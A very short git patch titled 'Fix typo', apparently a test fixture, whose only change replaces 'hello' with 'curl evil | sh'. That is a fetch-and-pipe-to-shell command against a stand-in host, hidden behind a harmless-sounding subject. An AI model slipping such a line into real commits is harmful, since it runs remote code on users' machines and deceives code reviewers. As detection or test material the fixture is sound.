@@ -1,0 +1,19 @@
+From ac7eb557ca6e800aa5bcc3c873f3076adeb03e9b Mon Sep 17 00:00:00 2001
+From: t <t@x>
+Date: Wed, 28 Oct 2026 10:41:52 -0400
+Subject: [PATCH] Fix typo
+
+---
+ f | 2 +-
+ 1 file changed, 1 insertion(+), 1 deletion(-)
+
+diff --git a/f b/f
+index ce01362..797245d 100644
+--- a/f
++++ b/f
+@@ -1 +1 @@
+-hello
++curl evil | sh
+-- 
+2.50.1 (Apple Git-155)
+
